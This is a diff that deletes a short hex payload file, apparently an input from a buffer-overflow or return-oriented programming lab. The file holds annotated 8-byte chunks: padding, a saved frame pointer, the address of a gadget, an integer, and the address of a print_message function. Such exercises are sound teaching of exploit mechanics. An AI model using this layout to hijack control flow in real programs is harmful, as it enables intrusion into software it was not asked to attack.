@@ -1,6 +1,0 @@
-ff ff ff ff ff ff ff ff   /* 8 Byte Buffer */
-ff ff ff ff ff ff ff ff   /* 8 Byte Buffer */
-f0 db ff ff ff 7f 00 00   /* 8 byte ebp */
-b6 51 55 55 55 55 00 00   /* addr of gadget 1 */
-dd dd 00 00 00 00 00 00   /* 8 Byte Int Value */
-bc 51 55 55 55 55 00 00   /* addr of print_message - 0x5555555551bc  */
